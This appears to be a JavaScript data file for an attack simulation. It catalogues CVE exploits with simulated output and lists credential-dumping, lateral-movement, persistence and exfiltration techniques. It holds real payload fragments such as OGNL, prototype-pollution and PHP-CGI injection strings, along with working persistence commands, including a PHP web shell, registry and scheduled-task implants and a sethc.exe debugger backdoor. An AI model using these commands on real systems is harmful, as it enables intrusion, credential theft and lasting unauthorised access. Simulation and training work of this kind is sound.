  { service: 'http', version: '5.x-6.x', cve: 'CVE-2019-7609', name: 'Kibana Prototype Pollution RCE', cvss: 9.0, exploit: 'kibana_rce', reliability: 0.6, stealth: 0.3, type: 'rce', os: 'any', desc: 'Kibana Timelion prototype pollution to RCE', output: '[*] Accessing Kibana at 10.10.2.50:5601\n[+] Version 6.5.4 vulnerable to CVE-2019-7609\n[*] Sending prototype pollution payload via Timelion\n.es(*).props(label.__proto__.env.AAAA="require(\'child_process\').exec(\'id\')")\n[+] Code execution as kibana user' },
  // Spring Cloud Gateway
  { service: 'spring', version: 'Gateway 3.0-3.1.0', cve: 'CVE-2022-22947', name: 'Spring Cloud Gateway RCE', cvss: 10.0, exploit: 'spring_gateway_rce', reliability: 0.8, stealth: 0.4, type: 'rce', os: 'any', desc: 'Spring Cloud Gateway code injection via Actuator', output: '[*] Testing Spring Cloud Gateway actuator\n[+] /actuator/gateway/routes accessible\n[*] Creating malicious route with SpEL injection\n[+] POST /actuator/gateway/routes/evil\n[*] Refreshing routes\n[+] RCE achieved via SpEL evaluation\nuid=1000(app) gid=1000(app)' },
  // Apache Struts
  { service: 'http', version: 'Struts 2.3-2.5', cve: 'CVE-2017-5638', name: 'Apache Struts Content-Type RCE', cvss: 10.0, exploit: 'struts_rce', reliability: 0.9, stealth: 0.3, type: 'rce', os: 'any', desc: 'Apache Struts 2 Jakarta Multipart Parser RCE', output: '[*] Testing Content-Type header for Struts RCE\n[+] Sending OGNL payload in Content-Type\n[*] Content-Type: %{(#_="multipart/form-data").(#dm=@ognl.OgnlContext@DEFAULT...)}\n[+] uid=1000(tomcat) gid=1000(tomcat)\n[*] Reverse shell established' },
  // ActiveMQ
  { service: 'activemq', version: '5.x', cve: 'CVE-2023-46604', name: 'Apache ActiveMQ RCE', cvss: 10.0, exploit: 'activemq_rce', reliability: 0.9, stealth: 0.3, type: 'rce', os: 'any', desc: 'Apache ActiveMQ ClassInfo deserialization RCE', output: '[*] Connecting to ActiveMQ at 10.0.0.100:61616\n[+] OpenWire protocol detected\n[*] Sending ExceptionResponse with ClassInfo command\n[+] Loading remote class from attacker server\n[*] Class executed on target\n[+] Shell as activemq user' },
  // JBoss
  { service: 'jboss', version: '4.x-6.x', cve: 'MISCONFIG', name: 'JBoss Default Deployment', cvss: 9.0, exploit: 'jboss_deploy', reliability: 0.6, stealth: 0.3, type: 'rce', os: 'any', desc: 'JBoss JMX/Web Console accessible without authentication', output: '[*] Accessing JBoss JMX Console at /jmx-console/\n[+] No authentication required!\n[*] Deploying WAR via MainDeployer\n[+] WAR deployed at /backdoor/cmd.jsp\n[*] Executing: id\nuid=1000(jboss) gid=1000(jboss)' },
  // WebLogic
  { service: 'weblogic', version: '10.x-12.x', cve: 'CVE-2019-2725', name: 'WebLogic Deserialization RCE', cvss: 9.8, exploit: 'weblogic_deser', reliability: 0.8, stealth: 0.3, type: 'rce', os: 'any', desc: 'Oracle WebLogic wls9_async deserialization RCE', output: '[*] Testing WebLogic at 10.0.0.110:7001\n[+] /_async/AsyncResponseService accessible\n[*] Sending SOAP XML with deserialization payload\n[+] Code execution achieved\n[*] whoami: oracle\n[+] Reverse shell established' },
  // PHP-CGI
  { service: 'http', version: 'PHP-CGI', cve: 'CVE-2024-4577', name: 'PHP-CGI Argument Injection', cvss: 9.8, exploit: 'php_cgi_rce', reliability: 0.85, stealth: 0.5, type: 'rce', os: 'windows', desc: 'PHP-CGI argument injection on Windows via Best-Fit encoding', output: '[*] Testing PHP-CGI at 10.0.0.120:80\n[+] Windows + PHP-CGI detected\n[*] Sending crafted query: ?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input\n[+] PHP code execution achieved\n[*] Running: system("whoami")\nnt authority\\iusr' },
  // Grafana
  { service: 'grafana', version: '8.x', cve: 'CVE-2021-43798', name: 'Grafana Path Traversal', cvss: 7.5, exploit: 'grafana_lfi', reliability: 0.85, stealth: 0.6, type: 'info_disclosure', os: 'any', desc: 'Grafana directory traversal via plugin routes', output: '[*] Testing Grafana at 10.0.0.130:3000\n[+] GET /public/plugins/alertlist/../../../../../../../../etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ngrafana:x:472:472:grafana:/usr/share/grafana:/bin/false\n[*] Reading /etc/grafana/grafana.ini\n[+] admin_password = Gr@fana2024' },
  // F5 BIG-IP
  { service: 'http', version: 'BIG-IP 16.x', cve: 'CVE-2022-1388', name: 'F5 BIG-IP Auth Bypass RCE', cvss: 9.8, exploit: 'f5_bigip_rce', reliability: 0.9, stealth: 0.3, type: 'rce', os: 'linux', desc: 'F5 BIG-IP iControl REST authentication bypass to RCE', output: '[*] Targeting F5 BIG-IP at 10.0.0.1:443\n[+] CVE-2022-1388 auth bypass confirmed\n[*] POST /mgmt/tm/util/bash with Connection: X-F5-Auth-Token\n[+] {"commandResult":"uid=0(root) gid=0(root) groups=0(root)"}\n[*] Root access on load balancer' },
  // Bitbucket
  { service: 'bitbucket', version: '7.x-8.x', cve: 'CVE-2022-36804', name: 'Bitbucket Command Injection', cvss: 9.9, exploit: 'bitbucket_rce', reliability: 0.8, stealth: 0.4, type: 'rce', os: 'any', desc: 'Atlassian Bitbucket Server command injection', output: '[*] Testing Bitbucket at 10.0.0.140:7990\n[+] Version 8.2.1 vulnerable to CVE-2022-36804\n[*] Sending crafted GET to /rest/api/latest/projects/KEY/repos/REPO/archive\n[+] Command injection via --prefix parameter\n[*] id: uid=2003(atlbitbucket) gid=2003(atlbitbucket)' },
  // MongoDB
  { service: 'mongodb', version: '*', cve: 'MISCONFIG', name: 'MongoDB Unauthenticated', cvss: 8.0, exploit: 'mongo_unauth', reliability: 0.7, stealth: 0.8, type: 'info_disclosure', os: 'any', desc: 'MongoDB exposed without authentication', output: '[*] Connecting to MongoDB at 10.0.0.150:27017\n[+] No authentication required\n[*] Listing databases:\n  admin    0.078GB\n  config   0.078GB\n  users    2.341GB\n  orders   5.129GB\n[*] db.users.find().limit(1)\n{ email: "admin@corp.local", password_hash: "5f4dcc3b..." }' },
  // CouchDB
  { service: 'couchdb', version: '1.x-2.x', cve: 'CVE-2017-12635', name: 'CouchDB Admin Creation', cvss: 9.8, exploit: 'couchdb_rce', reliability: 0.8, stealth: 0.5, type: 'rce', os: 'any', desc: 'CouchDB arbitrary admin account creation via duplicate roles', output: '[*] Connecting to CouchDB at 10.0.0.160:5984\n[+] Version 2.1.0 vulnerable\n[*] Creating admin user via roles duplication\n[+] PUT /_users/org.couchdb.user:hacker with duplicate "roles"\n[+] Admin user created\n[*] Executing OS commands via query server config\n[+] RCE as couchdb' },
  // Hadoop
  { service: 'hadoop', version: '*', cve: 'MISCONFIG', name: 'Hadoop YARN Unauth RCE', cvss: 9.8, exploit: 'yarn_rce', reliability: 0.85, stealth: 0.4, type: 'rce', os: 'linux', desc: 'Hadoop YARN ResourceManager unauthenticated command execution', output: '[*] Querying YARN ResourceManager at 10.0.0.170:8088\n[+] No authentication required\n[*] POST /ws/v1/cluster/apps/new-application\n[*] Submitting application with command: /bin/bash -c "id"\n[+] Application accepted: application_1234_0001\n[+] uid=1000(yarn) gid=1000(hadoop)' },
  // Apache Spark
  { service: 'spark', version: '*', cve: 'MISCONFIG', name: 'Spark Unauth RCE', cvss: 9.8, exploit: 'spark_rce', reliability: 0.8, stealth: 0.4, type: 'rce', os: 'linux', desc: 'Apache Spark REST API unauthenticated code execution', output: '[*] Accessing Spark Master at 10.0.0.180:6066\n[+] REST API accessible without auth\n[*] Submitting malicious Spark application\n[+] POST /v1/submissions/create\n[*] Application running\n[+] Reverse shell received as spark user' },
  // Consul
  { service: 'consul', version: '*', cve: 'MISCONFIG', name: 'Consul RCE via Services', cvss: 8.5, exploit: 'consul_rce', reliability: 0.7, stealth: 0.5, type: 'rce', os: 'any', desc: 'HashiCorp Consul agent unauthenticated service registration with script check', output: '[*] Accessing Consul API at 10.0.0.190:8500\n[+] No ACL enforcement\n[*] Registering service with script check\n[+] PUT /v1/agent/service/register with check.args=["/bin/bash","-c","id"]\n[+] Check executing commands as consul agent user\nuid=100(consul) gid=1000(consul)' },
  // etcd
  { service: 'etcd', version: '*', cve: 'MISCONFIG', name: 'etcd Unauthenticated', cvss: 8.0, exploit: 'etcd_unauth', reliability: 0.8, stealth: 0.7, type: 'info_disclosure', os: 'linux', desc: 'etcd key-value store exposed without authentication', output: '[*] Querying etcd at 10.0.0.200:2379\n[+] No authentication required\n[*] ETCDCTL_API=3 etcdctl get / --prefix\n[+] /registry/secrets/default/db-credentials\n  username: admin\n  password: Prod#DB2024\n[+] Kubernetes secrets exposed' },
  // Prometheus
  { service: 'prometheus', version: '*', cve: 'MISCONFIG', name: 'Prometheus Unauthenticated', cvss: 5.3, exploit: 'prom_unauth', reliability: 0.9, stealth: 0.9, type: 'info_disclosure', os: 'linux', desc: 'Prometheus metrics endpoint exposed - internal topology leak', output: '[*] Querying Prometheus at 10.0.0.210:9090\n[+] No authentication\n[*] /api/v1/targets shows all monitored hosts\n[+] Discovered 47 internal hosts with IPs and ports\n[*] /api/v1/query?query=process_open_fds\n[+] Internal service architecture mapped' },
  // RabbitMQ
  { service: 'rabbitmq', version: '*', cve: 'MISCONFIG', name: 'RabbitMQ Default Credentials', cvss: 7.5, exploit: 'rabbitmq_default', reliability: 0.5, stealth: 0.7, type: 'auth_bypass', os: 'any', desc: 'RabbitMQ management with default guest:guest credentials', output: '[*] Accessing RabbitMQ Management at 10.0.0.220:15672\n[+] guest:guest - Login successful!\n[*] Listing queues:\n  payment_processing: 1,234 messages\n  user_events: 567 messages\n[+] Can read/write all message queues' },
  // Solr
  { service: 'solr', version: '5.x-8.x', cve: 'CVE-2019-17558', name: 'Solr Velocity RCE', cvss: 9.8, exploit: 'solr_rce', reliability: 0.7, stealth: 0.4, type: 'rce', os: 'any', desc: 'Apache Solr Velocity template injection RCE', output: '[*] Testing Solr at 10.0.0.230:8983\n[+] Solr 8.1.1 detected\n[*] Enabling VelocityResponseWriter via Config API\n[+] POST /solr/core/config with params.resource.loader.enabled=true\n[*] Sending Velocity template with Runtime.exec\n[+] uid=8983(solr) gid=8983(solr)' },
  // Zabbix
  { service: 'zabbix', version: '5.x-6.x', cve: 'CVE-2022-23131', name: 'Zabbix SAML SSO Auth Bypass', cvss: 9.8, exploit: 'zabbix_auth_bypass', reliability: 0.8, stealth: 0.5, type: 'auth_bypass', os: 'any', desc: 'Zabbix SAML SSO authentication bypass to admin', output: '[*] Targeting Zabbix at 10.0.0.240:443\n[+] SAML authentication enabled\n[*] Forging SAML session cookie with admin username\n[+] Session hijacked as Admin\n[*] Creating script: system.run[id]\n[+] Executing on monitored hosts\nuid=997(zabbix) gid=995(zabbix)' },
  // Vault
  { service: 'vault', version: '*', cve: 'MISCONFIG', name: 'HashiCorp Vault Token Leak', cvss: 8.0, exploit: 'vault_token', reliability: 0.5, stealth: 0.8, type: 'credential_access', os: 'any', desc: 'Vault root token exposed in environment or config', output: '[*] Checking for Vault tokens\n[+] Found VAULT_TOKEN in /etc/environment\n[*] Using token to authenticate\n[+] vault kv list secret/\n  aws-creds\n  database\n  tls-certs\n  api-keys\n[+] Root-level access to all secrets' },
  // Memcached
  { service: 'memcached', version: '*', cve: 'MISCONFIG', name: 'Memcached Info Leak', cvss: 7.5, exploit: 'memcached_dump', reliability: 0.8, stealth: 0.8, type: 'info_disclosure', os: 'any', desc: 'Memcached exposed without authentication - session/cache data', output: '[*] Connecting to Memcached at 10.0.0.250:11211\n[+] stats\nSTAT pid 1234\nSTAT curr_items 8234\n[*] Dumping cached items\n[+] Found session tokens, API keys, cached credentials\nsession:admin:a8f3b2c1d4e5f6...\napi_key:stripe:<STRIPE_KEY>' },
];

// ============================================================================
// CREDENTIAL HARVESTING TECHNIQUES
// ============================================================================
const CRED_HARVEST = [
  { name: 'Mimikatz sekurlsa::logonpasswords', os: 'windows', accessLevel: 'SYSTEM', stealth: 0.3, desc: 'Dump plaintext passwords from LSASS memory', output: 'Authentication Id : 0 ; 999999\nSession           : Interactive from 1\nUser Name         : admin\nDomain            : CORP\nLogon Server      : DC01\nSID               : S-1-5-21-...\n  msv :\n   [00000003] Primary\n   * Username : admin\n   * Domain   : CORP\n   * NTLM     : aad3b435b51404eeaad3b435b51404ee\n   * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709\n  wdigest :\n   * Username : admin\n   * Domain   : CORP\n   * Password : P@ssw0rd2024!' },
  { name: 'Mimikatz lsadump::sam', os: 'windows', accessLevel: 'SYSTEM', stealth: 0.4, desc: 'Dump local SAM database hashes', output: 'RID  : 000001f4 (500)\nUser : Administrator\n  Hash NTLM: 7f1c3b9d8e2a4c5f6b7d8e9f0a1b2c3d\n\nRID  : 000003e9 (1001)\nUser : svc_backup\n  Hash NTLM: e10adc3949ba59abbe56e057f20f883e' },
  { name: 'Mimikatz DCSync', os: 'windows', accessLevel: 'Domain Admin', stealth: 0.2, desc: 'Replicate domain credentials via DRS protocol', output: '[DC] "corp.local" will be the domain\n[DC] "DC01.corp.local" will be the DC\n[DC] "krbtgt" will be the user\n\nObject RDN           : krbtgt\n** SAM ACCOUNT NAME: krbtgt\nHash NTLM: a577fcf1ce1eb2... \nSupplemental Credentials:\n  Primary:NTLM-Strong-NTOWF\n    Random Value : ...' },
  { name: 'hashdump', os: 'windows', accessLevel: 'SYSTEM', stealth: 0.5, desc: 'Dump password hashes from SAM/SYSTEM hives', output: 'Administrator:500:aad3b435b51404eeaad3b435b51404ee:7f1c3b9d8e2a4c5f6b7d8e9f0a1b2c3d:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nsvc_sql:1001:aad3b435b51404eeaad3b435b51404ee:e10adc3949ba59abbe56e057f20f883e:::' },
  { name: '/etc/shadow extraction', os: 'linux', accessLevel: 'root', stealth: 0.5, desc: 'Read password hashes from shadow file', output: 'root:$6$rounds=5000$salt$hash...:19000:0:99999:7:::\nadmin:$6$xYz123$abc...:19000:0:99999:7:::\nwww-data:*:19000:0:99999:7:::' },
  { name: 'SSH key extraction', os: 'linux', accessLevel: 'user', stealth: 0.8, desc: 'Steal SSH private keys from user directories', output: 'Found SSH keys:\n/home/admin/.ssh/id_rsa (RSA 2048)\n/home/deploy/.ssh/id_ed25519 (ED25519)\n/root/.ssh/id_rsa (RSA 4096)\n[+] 3 private keys extracted' },
  { name: 'Browser credential extraction', os: 'any', accessLevel: 'user', stealth: 0.6, desc: 'Extract saved passwords from browsers', output: 'Chrome saved passwords:\nhttps://vpn.corp.local | admin | VPNpass123!\nhttps://jenkins.corp.local | admin | jenkins\nhttps://gitlab.corp.local | root | GitL@b2024\n[+] 12 credentials extracted' },
  { name: 'Keylogger capture', os: 'any', accessLevel: 'user', stealth: 0.7, desc: 'Capture keystrokes including passwords', output: '[keylog] User typed in RDP session:\nUsername: domain_admin\nPassword: Str0ng#P@ss!\n[+] Credential captured via keylogger' },
  { name: 'DPAPI master key extraction', os: 'windows', accessLevel: 'SYSTEM', stealth: 0.5, desc: 'Decrypt DPAPI protected secrets', output: '[*] Extracting DPAPI master keys\n[+] Decrypted 4 credential blobs:\nTarget: Domain:interactive=CORP\\admin\n  UserName: admin\n  Password: P@ssw0rd2024!\nTarget: MicrosoftOffice16_Data:SSPI:cashzombs@gmail.com\n  Password: [REDACTED]' },
  { name: 'Kerberos ticket harvest', os: 'windows', accessLevel: 'user', stealth: 0.7, desc: 'Export Kerberos TGT/TGS tickets from memory', output: '[*] Listing Kerberos tickets\nClient: admin @ CORP.LOCAL\nServer: krbtgt/CORP.LOCAL @ CORP.LOCAL\nKerbTicket Encryption: AES-256-CTS-HMAC-SHA1-96\nTicket Flags: 0x40e10000\nStart Time: 9/12/2026 10:00:00\nEnd Time:   9/12/2026 20:00:00\n[+] TGT exported to admin.kirbi' },
  { name: 'WiFi password extraction', os: 'windows', accessLevel: 'admin', stealth: 0.8, desc: 'Extract saved WiFi passwords via netsh', output: '[*] netsh wlan show profiles\n  CORP-WIFI\n  GUEST-WIFI\n[*] netsh wlan show profile name="CORP-WIFI" key=clear\n  Key Content: Corp@WiFi2024!\n[+] 2 WiFi passwords extracted' },
  { name: 'Windows Vault credentials', os: 'windows', accessLevel: 'user', stealth: 0.7, desc: 'Dump Windows Credential Vault entries', output: '[*] vaultcmd /listcreds:"Windows Credentials" /all\nTarget: TERMSRV/10.0.1.10\n  UserName: CORP\\admin\n  Password: P@ssw0rd2024!\nTarget: TERMSRV/10.0.1.40\n  UserName: CORP\\svc_backup\n  Password: Backup#2024\n[+] 4 vault credentials extracted' },
  { name: 'GPP Passwords (cpassword)', os: 'windows', accessLevel: 'user', stealth: 0.9, desc: 'Extract passwords from Group Policy Preferences XML', output: '[*] Searching SYSVOL for Groups.xml\n[+] \\\\CORP.LOCAL\\SYSVOL\\corp.local\\Policies\\{GUID}\\Machine\\Preferences\\Groups\\Groups.xml\n  cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"\n[*] Decrypting with published AES key\n[+] Password: GPPpassword1' },
  { name: 'NTDS.dit offline extraction', os: 'windows', accessLevel: 'Domain Admin', stealth: 0.3, desc: 'Copy NTDS.dit via Volume Shadow Copy for offline hash extraction', output: '[*] Creating VSS shadow copy of C:\n[+] Shadow copy created: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\n[*] Copying NTDS.dit and SYSTEM hive\n[+] ntds.dit (280 MB) extracted\n[*] secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL\n[+] Dumped 3,847 domain user hashes' },
  { name: 'Cloud metadata credentials', os: 'linux', accessLevel: 'user', stealth: 0.8, desc: 'Steal IAM role credentials from cloud instance metadata', output: '[*] curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n[+] EC2-Admin-Role\n[*] Retrieving temporary credentials\n[+] AccessKeyId: ASIAXYZ...\n[+] SecretAccessKey: wJalr...\n[+] SessionToken: FwoGZX...\n[*] Credentials valid for 6 hours' },
];

// ============================================================================
// LATERAL MOVEMENT TECHNIQUES
// ============================================================================
const LATERAL_TECHNIQUES = [
  { name: 'Pass-the-Hash (PtH)', tool: 'psexec/mimikatz', protocol: 'SMB', os: 'windows', stealth: 0.3, reliability: 0.8, requiresCreds: 'ntlm_hash', mitre: 'T1550.002', desc: 'Authenticate with NTLM hash without knowing plaintext', output: '[*] Using hash: aad3b435b51404ee:7f1c3b9d8e2a4c5f\n[*] Connecting to \\\\TARGET\\ADMIN$\n[+] Authentication successful\n[*] Uploading service binary\n[+] Service installed and started\n[*] Shell opened as NT AUTHORITY\\SYSTEM' },
  { name: 'Pass-the-Ticket (PtT)', tool: 'rubeus/mimikatz', protocol: 'Kerberos', os: 'windows', stealth: 0.5, reliability: 0.7, requiresCreds: 'kirbi_ticket', mitre: 'T1550.003', desc: 'Use stolen Kerberos ticket for authentication', output: '[*] Importing ticket: admin.kirbi\n[+] Ticket imported for admin@CORP.LOCAL\n[*] Accessing \\\\DC01\\C$\n[+] Access granted' },
  { name: 'PsExec', tool: 'Impacket/Sysinternals', protocol: 'SMB', os: 'windows', stealth: 0.2, reliability: 0.9, requiresCreds: 'password', mitre: 'T1569.002', desc: 'Remote command execution via SMB service creation', output: '[*] psexec.py CORP/admin:P@ssw0rd@10.0.0.20\n[*] Uploading PSEXESVC.exe\n[*] Creating service RemComSvc\n[*] Starting service\nMicrosoft Windows [Version 10.0.19041]\nC:\\Windows\\system32>' },
  { name: 'WMI Execution', tool: 'wmiexec/Impacket', protocol: 'WMI', os: 'windows', stealth: 0.5, reliability: 0.8, requiresCreds: 'password', mitre: 'T1047', desc: 'Remote command execution via WMI', output: '[*] wmiexec.py CORP/admin:P@ssw0rd@10.0.0.20\n[*] WMI connection established\nC:\\> whoami\ncorp\\admin' },
  { name: 'WinRM', tool: 'evil-winrm/PowerShell', protocol: 'WinRM', os: 'windows', stealth: 0.6, reliability: 0.85, requiresCreds: 'password', mitre: 'T1021.006', desc: 'Remote PowerShell via Windows Remote Management', output: '[*] evil-winrm -i 10.0.0.20 -u admin -p P@ssw0rd\n[+] Connected to 10.0.0.20\n*Evil-WinRM* PS C:\\Users\\admin\\Documents>' },
  { name: 'SSH with stolen keys', tool: 'ssh', protocol: 'SSH', os: 'linux', stealth: 0.7, reliability: 0.9, requiresCreds: 'ssh_key', mitre: 'T1021.004', desc: 'SSH using extracted private keys', output: '[*] ssh -i stolen_id_rsa admin@10.0.0.50\n[+] Connected to 10.0.0.50\nadmin@target:~$' },
  { name: 'RDP Hijacking', tool: 'tscon', protocol: 'RDP', os: 'windows', stealth: 0.4, reliability: 0.7, requiresCreds: 'SYSTEM', mitre: 'T1563.002', desc: 'Hijack existing RDP sessions without credentials', output: '[*] Listing active sessions:\n Session 2: admin (Active)\n Session 3: domain_admin (Disconnected)\n[*] tscon 3 /dest:console\n[+] Session hijacked - now domain_admin' },
  { name: 'DCOM Execution', tool: 'dcomexec/Impacket', protocol: 'DCOM', os: 'windows', stealth: 0.5, reliability: 0.7, requiresCreds: 'password', mitre: 'T1021.003', desc: 'Remote execution via DCOM objects', output: '[*] dcomexec.py CORP/admin:P@ssw0rd@10.0.0.20\n[*] Using MMC20.Application DCOM object\n[+] Command executed successfully' },
  { name: 'SSH Tunneling/Pivoting', tool: 'ssh/chisel', protocol: 'SSH', os: 'linux', stealth: 0.6, reliability: 0.9, requiresCreds: 'ssh_key', mitre: 'T1572', desc: 'Create SSH tunnel to pivot into internal networks', output: '[*] ssh -D 1080 -N admin@10.0.0.50\n[+] SOCKS proxy established on port 1080\n[*] Scanning 172.16.0.0/24 through pivot\n[+] Discovered 12 new hosts on internal subnet' },
  { name: 'Golden Ticket', tool: 'mimikatz/ticketer', protocol: 'Kerberos', os: 'windows', stealth: 0.4, reliability: 0.95, requiresCreds: 'krbtgt_hash', mitre: 'T1558.001', desc: 'Forge Kerberos TGT with krbtgt hash for any user', output: '[*] Creating Golden Ticket\n  Domain: CORP.LOCAL\n  SID: S-1-5-21-...\n  krbtgt hash: a577fcf1ce1eb2...\n  User: FakeAdmin\n  ID: 500\n[+] Golden Ticket created\n[*] Injecting ticket into current session\n[+] Now authenticating as any user to any service' },
];

// ============================================================================
// PERSISTENCE MECHANISMS
// ============================================================================
const PERSISTENCE_METHODS = [
  { name: 'Registry Run Key', os: 'windows', accessLevel: 'user', stealth: 0.4, detection: 0.6, mitre: 'T1547.001', desc: 'Add autorun program via registry', cmd: 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d "C:\\Users\\Public\\beacon.exe"' },
  { name: 'Scheduled Task', os: 'windows', accessLevel: 'admin', stealth: 0.3, detection: 0.7, mitre: 'T1053.005', desc: 'Create persistent scheduled task', cmd: 'schtasks /create /tn "WindowsUpdate" /tr "C:\\Windows\\Temp\\payload.exe" /sc onlogon /ru SYSTEM' },
  { name: 'Windows Service', os: 'windows', accessLevel: 'SYSTEM', stealth: 0.3, detection: 0.7, mitre: 'T1543.003', desc: 'Install malicious Windows service', cmd: 'sc create SysHealth binpath= "C:\\Windows\\System32\\svchost.exe -k netsvcs" start= auto' },
  { name: 'WMI Event Subscription', os: 'windows', accessLevel: 'admin', stealth: 0.6, detection: 0.4, mitre: 'T1546.003', desc: 'WMI permanent event consumer for fileless persistence', cmd: 'wmic /NAMESPACE:"\\\\root\\subscription" PATH __EventConsumer' },
  { name: 'DLL Search Order Hijacking', os: 'windows', accessLevel: 'user', stealth: 0.7, detection: 0.3, mitre: 'T1574.001', desc: 'Place malicious DLL in application search path', cmd: 'copy beacon.dll "C:\\Program Files\\Vulnerable App\\version.dll"' },
  { name: 'Cron Job', os: 'linux', accessLevel: 'user', stealth: 0.4, detection: 0.6, mitre: 'T1053.003', desc: 'Add persistent cron job', cmd: 'echo "*/5 * * * * /tmp/.hidden/beacon" | crontab -' },
  { name: 'SSH Authorized Keys', os: 'linux', accessLevel: 'user', stealth: 0.6, detection: 0.4, mitre: 'T1098.004', desc: 'Add attacker SSH key for persistent access', cmd: 'echo "ssh-rsa AAAA... attacker@kali" >> ~/.ssh/authorized_keys' },
  { name: 'Systemd Service', os: 'linux', accessLevel: 'root', stealth: 0.5, detection: 0.5, mitre: 'T1543.002', desc: 'Create persistent systemd unit', cmd: 'cat > /etc/systemd/system/syshealth.service << EOF\n[Unit]\nDescription=System Health\n[Service]\nExecStart=/opt/.beacon\nRestart=always\n[Install]\nWantedBy=multi-user.target\nEOF' },
  { name: 'Web Shell', os: 'any', accessLevel: 'www-data', stealth: 0.5, detection: 0.5, mitre: 'T1505.003', desc: 'Plant web shell in web root', cmd: 'echo \'<?php system($_GET["cmd"]); ?>\' > /var/www/html/.config.php' },
  { name: 'COM Object Hijacking', os: 'windows', accessLevel: 'user', stealth: 0.7, detection: 0.3, mitre: 'T1546.015', desc: 'Hijack COM object CLSID for persistence', cmd: 'reg add HKCU\\Software\\Classes\\CLSID\\{...}\\InProcServer32 /d "C:\\beacon.dll"' },
  { name: 'Golden Ticket', os: 'windows', accessLevel: 'Domain Admin', stealth: 0.8, detection: 0.2, mitre: 'T1558.001', desc: 'Forged Kerberos TGT with 10-year validity', cmd: 'mimikatz # kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt' },
  { name: 'Skeleton Key', os: 'windows', accessLevel: 'Domain Admin', stealth: 0.6, detection: 0.3, mitre: 'T1556.001', desc: 'Patch LSASS on DC to accept a master password', cmd: 'mimikatz # misc::skeleton\n[+] Now any user can auth with password "mimikatz"' },
  { name: 'Image File Execution Options', os: 'windows', accessLevel: 'admin', stealth: 0.6, detection: 0.4, mitre: 'T1546.012', desc: 'Set debugger for common utility to execute implant', cmd: 'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v Debugger /t REG_SZ /d "C:\\Windows\\System32\\cmd.exe"' },
  { name: 'AppInit_DLLs', os: 'windows', accessLevel: 'admin', stealth: 0.5, detection: 0.5, mitre: 'T1546.010', desc: 'Load malicious DLL into every user-mode process', cmd: 'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\\Windows\\beacon.dll"\nreg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1' },
  { name: 'Netsh Helper DLL', os: 'windows', accessLevel: 'admin', stealth: 0.7, detection: 0.3, mitre: 'T1546.007', desc: 'Register DLL as Netsh helper for persistence', cmd: 'netsh add helper C:\\Windows\\Temp\\beacon.dll' },
  { name: 'Time Provider DLL', os: 'windows', accessLevel: 'SYSTEM', stealth: 0.8, detection: 0.2, mitre: 'T1547.003', desc: 'Register malicious DLL as Windows Time Provider', cmd: 'reg add "HKLM\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpClient" /v DllName /t REG_SZ /d "C:\\Windows\\System32\\beacon.dll"' },
  { name: 'Logon Script (AD GPO)', os: 'windows', accessLevel: 'Domain Admin', stealth: 0.5, detection: 0.4, mitre: 'T1037.001', desc: 'Set logon script via AD GPO to run on every domain login', cmd: 'Set-ADUser -Identity "CN=Users" -ScriptPath "\\\\DC01\\NETLOGON\\update.bat"' },
];

// ============================================================================
// EXFILTRATION METHODS
// ============================================================================
const EXFIL_METHODS = [
  { name: 'HTTPS POST', stealth: 0.7, bandwidth: 'high', detection: 0.3, mitre: 'T1048.002', desc: 'Exfiltrate via encrypted HTTPS to attacker server' },
  { name: 'DNS Tunneling', stealth: 0.8, bandwidth: 'low', detection: 0.4, mitre: 'T1048.003', desc: 'Encode data in DNS queries to attacker-controlled domain' },
  { name: 'Cloud Storage Upload', stealth: 0.6, bandwidth: 'high', detection: 0.5, mitre: 'T1567.002', desc: 'Upload to legitimate cloud services (S3, Azure Blob, GDrive)' },
  { name: 'Email Exfiltration', stealth: 0.5, bandwidth: 'medium', detection: 0.6, mitre: 'T1048.003', desc: 'Send data as email attachments via corporate mail' },
  { name: 'ICMP Tunneling', stealth: 0.7, bandwidth: 'low', detection: 0.4, mitre: 'T1095', desc: 'Encode data within ICMP echo request/reply packets' },
  { name: 'Steganography', stealth: 0.9, bandwidth: 'low', detection: 0.1, mitre: 'T1027.003', desc: 'Hide data within images uploaded to public platforms' },
];

// ============================================================================
// ZERO-DAY TEMPLATES — simulated novel vulnerability discoveries
// ============================================================================
const ZERO_DAY_TEMPLATES = [
  { name: 'Stack Buffer Overflow in Custom Login Service', type: 'rce', cvss: 9.8, reliability: 0.35, service: 'http', desc: 'Fuzzing the login endpoint revealed a stack-based buffer overflow when the username field exceeds 2048 bytes. The service crashes and EIP is overwritten at offset 1032.', output: '[FUZZ] Sending payload of 3000 bytes to POST /api/login\n[CRASH] Service crashed — analyzing core dump\n[+] EIP overwrite at offset 1032\n[+] Stack is executable (NX disabled)\n[+] Crafting shellcode payload\n[*] Reliability: LOW — race condition with ASLR' },
  { name: 'Authentication Bypass in Proprietary Admin Portal', type: 'auth_bypass', cvss: 9.1, reliability: 0.5, service: 'http', desc: 'The admin portal accepts a crafted JSON payload that bypasses the authentication check by sending a null session token with admin role claim.', output: '[FUZZ] Testing auth endpoints with malformed tokens\n[+] POST /admin/api with {"token":null,"role":"admin"} returned 200 OK\n[+] Full admin access without credentials\n[*] Likely a type confusion in the auth middleware' },
